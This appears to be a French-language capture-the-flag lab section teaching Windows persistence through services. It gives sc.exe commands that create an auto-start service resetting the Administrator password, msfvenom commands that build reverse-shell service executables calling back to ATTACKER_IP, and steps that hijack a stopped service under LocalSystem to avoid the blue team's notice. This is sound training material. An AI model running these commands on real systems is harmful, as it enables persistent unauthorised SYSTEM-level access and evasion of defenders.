Les services Windows offrent un excellent moyen d'établir la persistance puisqu'ils peuvent être configurés pour s'exécuter en arrière-plan à chaque démarrage de la machine victime. Si nous pouvons exploiter n'importe quel service pour exécuter quelque chose à notre place, nous pouvons reprendre le contrôle de la machine victime à chaque démarrage.

Un service est essentiellement un exécutable qui s'exécute en arrière-plan. Lors de la configuration d'un service, vous définissez quel exécutable sera utilisé et sélectionnez si le service s'exécutera automatiquement au démarrage de la machine ou s'il doit être démarré manuellement.

Il existe deux manières principales d'abuser des services pour établir la persistance : soit créer un nouveau service, soit modifier un service existant pour exécuter notre charge utile.

Création de services de porte dérobée

Nous pouvons créer et démarrer un service nommé « THMservice » en utilisant les commandes suivantes :

```
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

Remarque : Il doit y avoir un espace après chaque signe égal pour que la commande fonctionne.

La commande "net user" sera exécutée au démarrage du service, réinitialisant le mot de passe de l'administrateur sur `Passwd123`. Remarquez comment le service a été configuré pour démarrer automatiquement (start= auto), afin qu'il s'exécute sans nécessiter l'intervention de l'utilisateur.

Réinitialiser le mot de passe d'un utilisateur fonctionne assez bien, mais on peut également créer un shell inversé avec msfvenom et l'associer au service créé. Notez cependant que les exécutables de service sont uniques car ils doivent implémenter un protocole particulier pour être gérés par le système. Si vous souhaitez créer un exécutable compatible avec les services Windows, vous pouvez utiliser le `exe-service`format dans msfvenom :

Boîte d'attaque

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Vous pouvez ensuite copier l'exécutable sur votre système cible, dire `C:\Windows`et y pointer le binPath du service :

```
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

Cela devrait créer une connexion avec la machine de votre attaquant.


Modification des services existants

Bien que la création de nouveaux services pour la persistance fonctionne plutôt bien, l'équipe bleue peut surveiller la création de nouveaux services sur le réseau. Nous souhaiterons peut-être réutiliser un service existant au lieu d'en créer un pour éviter toute détection. Habituellement, tout service désactivé sera un bon candidat, car il pourrait être modifié sans que l'utilisateur ne s'en aperçoive.

Vous pouvez obtenir une liste des services disponibles à l'aide de la commande suivante :

Invite de commande

```
C:\> sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Vous devriez pouvoir trouver un service arrêté appelé THMService3. Pour interroger la configuration du service, vous pouvez utiliser la commande suivante :

Invite de commande

```
C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       :
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

Il y a trois choses qui nous intéressent lorsque nous utilisons un service à des fins de persistance :

-   L'exécutable ( BINARY_PATH_NAME ) doit pointer vers notre charge utile.
-   Le service START_TYPE doit être automatique afin que la charge utile s'exécute sans interaction de l'utilisateur.
-   Le SERVICE_START_NAME , qui est le compte sous lequel le service sera exécuté, doit de préférence être défini sur LocalSystem pour obtenir les privilèges SYSTEM.

Commençons par créer un nouveau reverse shell avec msfvenom :

Boîte d'attaque

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

Pour reconfigurer les paramètres "THMservice3", on peut utiliser la commande suivante :

Invite de commande

```
C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

Vous pouvez ensuite interroger à nouveau la configuration du service pour vérifier si tout s'est déroulé comme prévu :

Invite de commande

```
C:\> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

